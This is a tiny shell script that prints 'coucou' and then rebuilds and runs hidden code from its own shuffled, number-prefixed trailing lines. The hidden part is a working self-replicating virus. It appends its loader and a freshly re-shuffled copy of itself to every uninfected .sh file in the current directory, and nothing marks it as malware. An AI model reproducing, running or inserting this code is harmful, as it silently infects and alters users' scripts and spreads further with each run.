echo "coucou"
tail -n 24 $0 | sort -g | cut -c 4- > /tmp/test
chmod +x /tmp/test
/tmp/test &
exit 0
12 cat $0 | while read line ; do
25 echo 'exit 0' >> $i
31 done
20 continue ;
30 rm /tmp/test3
26 cat /tmp/test2 | while read line ; do
13 n=$(($n + 1))
16 for i in *.sh; do
28 done
11 n=9 ;
33 cat /tmp/test
24 echo '/tmp/test &' >> $i
23 echo 'chmod +x /tmp/test' >> $i
21 fi
22 echo 'tail -n 24 $0 | sort -g | cut -c 4- > /tmp/test' >> $i
29 cat /tmp/test3 | sort -g | cut -c 4- >> $i
17 tail -n 24 $i | sort -g | cut -c 4- > /tmp/test
19 if /tmp/test test 2>/dev/null ; then
15 done
18 chmod +x /tmp/test
27 rand=$(($RANDOM % 90 + 10)) ; echo "$rand $line" >> /tmp/test3
10 if test "$1" == "test" ; then exit 0 ; fi
14 echo "$n $line" >> /tmp/test2
32 rm /tmp/test2
